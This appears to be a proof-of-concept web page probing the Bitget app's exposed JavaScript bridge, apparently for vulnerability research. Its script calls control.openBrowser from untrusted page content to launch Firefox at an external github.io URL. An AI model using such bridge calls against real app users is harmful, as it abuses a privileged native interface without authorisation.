<!DOCTYPE html><html><head><title>Bitget JSBridge PoC</title></head>
<body>
<h2>Bitget JSBridge PoC v10 openBrowser only</h2>
<pre id="out">running...</pre>
<script>
function log(s){document.getElementById('out').textContent += "\n" + s;}
setTimeout(function(){
  if (!window.control) { log("NO control"); return; }
  log("control present");
  try {
    control.openBrowser(JSON.stringify({
      appPackage: "org.mozilla.firefox",
      appName: "FireFox",
      appUrl: "https://createnewdemo.github.io/bgjspoc/?v=via-openBrowser"
    }));
    log("openBrowser invoked");
  } catch(e){ log("ERR "+e); }
  log("done");
}, 500);
</script>
</body></html>
